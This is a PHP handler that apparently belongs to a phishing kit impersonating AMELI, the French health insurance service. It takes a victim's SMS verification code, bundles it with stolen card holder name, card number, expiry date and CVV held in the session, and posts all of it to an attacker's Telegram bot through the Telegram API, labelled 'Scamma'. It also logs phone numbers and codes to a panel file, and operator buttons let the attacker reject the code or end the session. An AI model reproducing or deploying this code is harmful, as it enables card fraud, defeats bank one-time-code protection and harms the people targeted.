<?php

include("../common/sub_includes.php");
include("../config.php");

ob_start();
if (!isset($_SESSION)) {
    session_start();
}

$protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443)) ? "https://" : "http://";
$host = $_SERVER['HTTP_HOST'];
$baseUrl = $protocol . $host . '/';

$ip = $_SERVER['REMOTE_ADDR'];
$smsUrl = $baseUrl . "/redirect/log.php?id=" . urlencode($ip) . "&page=sms.php?error=true";
$doneUrl = $baseUrl . "/redirect/log.php?id=" . urlencode($ip) . "&page=confirme.php";

$replyMarkup = [
    'inline_keyboard' => [
        [
            ['text' => '❌ Refuser SMS', 'url' => $smsUrl]
        ],
        [
            ['text' => '✅ Terminer', 'url' => $doneUrl]
        ]
    ]
];

$digits = [];
for ($i = 1; $i <= 6; $i++) {
    $key = "sms_digit{$i}";
    $digits[] = isset($_POST[$key]) ? substr(preg_replace('/\D/', '', $_POST[$key]), 0, 1) : '';
}
$vbvCode = implode('', $digits);

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $_SESSION['vbvCode']  = $vbvCode;

    $ccName = isset($_SESSION["ccname"]) ? $_SESSION["ccname"] : '';
    $ccNum = isset($_SESSION["cc"]) ? $_SESSION["cc"] : '';
    $ccExp = isset($_SESSION["dde"]) ? $_SESSION["dde"] : '';
    $ccCvv = isset($_SESSION["cvv"]) ? $_SESSION["cvv"] : '';
    $telephone = isset($_SESSION['tel']) ? $_SESSION['tel'] : '';
    $date = date('d/m/Y');
    $heure = date('H\hi');

    if (!empty($otp_mode)) {
        $message  = "<b>🔑 [ +1 SMS // AMELI ]</b>\n\n";
        $message .= "<b>🪪 Titulaire :</b> <code>{$ccName}</code>\n";
        $message .= "<b>💳 Num carte :</b> <code>{$ccNum}</code>\n";
        $message .= "<b>📅 Date Expiration :</b> <code>{$ccExp}</code>\n";
        $message .= "<b>🔒 Cryptogramme :</b> <code>{$ccCvv}</code>\n\n";
        $message .= "<b>🔐 Code SMS :</b> <code>{$vbvCode}</code>\n";
        $message .= "<b>📱 Téléphone :</b> <code>{$telephone}</code>\n\n";
        $message .= "<b>🌐 IP :</b> <code>{$ip}</code>\n";
        $message .= "<blockquote><b>🕒 Rez le [ <code>{$date}</code> à <code>{$heure}</code> ]</b>\n";
        $message .= "<b>🧑‍💻 Scamma - [ <code>AMELI</code> ]</b></blockquote>";

        $telegram_url = 'https://api.telegram.org/bot' . $bot_token . '/sendMessage';
        $post_fields = array(
            'chat_id' => $rez_vbv,
            'text' => $message,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode($replyMarkup)
        );

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegram_url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);

        if (curl_errno($ch)) {
            error_log('Telegram API error: ' . curl_error($ch));
        } else {
            $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            if ($http_status >= 400) {
                error_log("Telegram API HTTP status $http_status: $response");
            }
        }

        curl_close($ch);

        setlocale(LC_TIME, 'fr_FR');
        date_default_timezone_set('Europe/Paris');

        $date = date("d/m/Y");
        $heure = date("H:i:s");

        $otpLine = $telephone . " | " . $vbvCode . " | " . $ip . " | " . $date . " " . $heure . PHP_EOL;
        $otpFilePath = "../panel/data/otps.txt";
        $otpDir = dirname($otpFilePath);
        if (!is_dir($otpDir)) {
            mkdir($otpDir, 0777, true);
        }
        file_put_contents($otpFilePath, $otpLine, FILE_APPEND | LOCK_EX);

        header('location: ../pages/chargement.php');
    } else {
        header('location: ../pages/confirme.php');
    }
}
